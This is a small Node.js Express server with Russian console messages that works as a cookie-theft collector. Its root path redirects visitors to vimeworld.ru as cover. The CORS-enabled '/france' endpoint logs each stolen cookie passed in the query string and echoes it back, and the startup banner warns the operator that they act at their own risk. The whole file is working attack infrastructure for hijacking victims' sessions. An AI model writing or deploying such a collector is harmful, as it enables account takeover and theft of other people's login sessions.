const express = require("express");
const app = express();

app.use(require("cors")());
app.get("/", (req, res) => res.redirect("https://vimeworld.ru"));
app.get("/france", (req, res) => {
    console.log(`* Новый куки: ${req.query.cookie}`);
    return res.json(["fetched", req.query.cookie]);
});

app.listen(80, () => console.info(`[!] ВЫ ДЕЛАЕТЕ ЭТО НА СВОЙ СТРАХ И РИСК.\n* Приложение запущено.`));